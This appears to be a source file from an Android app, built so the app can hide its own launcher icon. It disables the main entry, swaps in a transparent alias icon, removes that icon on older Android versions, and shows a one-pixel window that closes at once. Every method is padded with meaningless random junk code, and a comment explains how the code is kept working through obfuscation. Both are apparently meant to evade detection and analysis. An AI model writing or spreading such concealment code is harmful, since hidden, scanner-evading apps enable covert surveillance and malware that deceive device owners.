package msbp.gzry.jqhe;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（JWVI），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class ZIIU extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        int process_OnbwLIrgqMOakNYvIZF = new java.util.Random().nextInt(50);
        int stack_ppSrhG = (process_OnbwLIrgqMOakNYvIZF > 56) ? 1 : ((process_OnbwLIrgqMOakNYvIZF > 5) ? 91 : ((process_OnbwLIrgqMOakNYvIZF > 57) ? 91 : 41));
        int i_DCrUQdQjrCizdjrk = stack_ppSrhG * process_OnbwLIrgqMOakNYvIZF;
        if (i_DCrUQdQjrCizdjrk > 7) {
            java.lang.System.arraycopy(new int[] { i_DCrUQdQjrCizdjrk }, 0, new int[] { 0 }, 0, 1);
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(ZIIU.this, JWVI.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(ZIIU.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        int process_OnbwLIrgqMOakNYvIZF = new java.util.Random().nextInt(50);
        int stack_ppSrhG = (process_OnbwLIrgqMOakNYvIZF > 56) ? 1 : ((process_OnbwLIrgqMOakNYvIZF > 5) ? 91 : ((process_OnbwLIrgqMOakNYvIZF > 57) ? 91 : 41));
        int i_DCrUQdQjrCizdjrk = stack_ppSrhG * process_OnbwLIrgqMOakNYvIZF;
        if (i_DCrUQdQjrCizdjrk > 7) {
            java.lang.System.arraycopy(new int[] { i_DCrUQdQjrCizdjrk }, 0, new int[] { 0 }, 0, 1);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        java.lang.Object arr_YIXSZrHPosvJAEmzuH = new java.lang.Object();
        int i_RWtQIftzKsTcJnkjghD = arr_YIXSZrHPosvJAEmzuH.hashCode();
        int j_bvMTBQNUFOG = new java.util.Random().nextInt(100);
        int tmp_DCiRT = (i_RWtQIftzKsTcJnkjghD ^ j_bvMTBQNUFOG) & 0x7FFFFFFF;
        if (tmp_DCiRT == 89 && i_RWtQIftzKsTcJnkjghD < 28) {
            arr_YIXSZrHPosvJAEmzuH.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onaymUrGYGYiKWz = java.util.UUID.randomUUID().toString();
        int ckuywHOMSwULIkgk = onaymUrGYGYiKWz.length();
        char pmh_nJjtQJErVmn = onaymUrGYGYiKWz.charAt(new java.util.Random().nextInt(ckuywHOMSwULIkgk));
        boolean dimaLrmNl = (pmh_nJjtQJErVmn == 'z');
        if (dimaLrmNl && ckuywHOMSwULIkgk < 54) {
            onaymUrGYGYiKWz.substring(83, 79);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
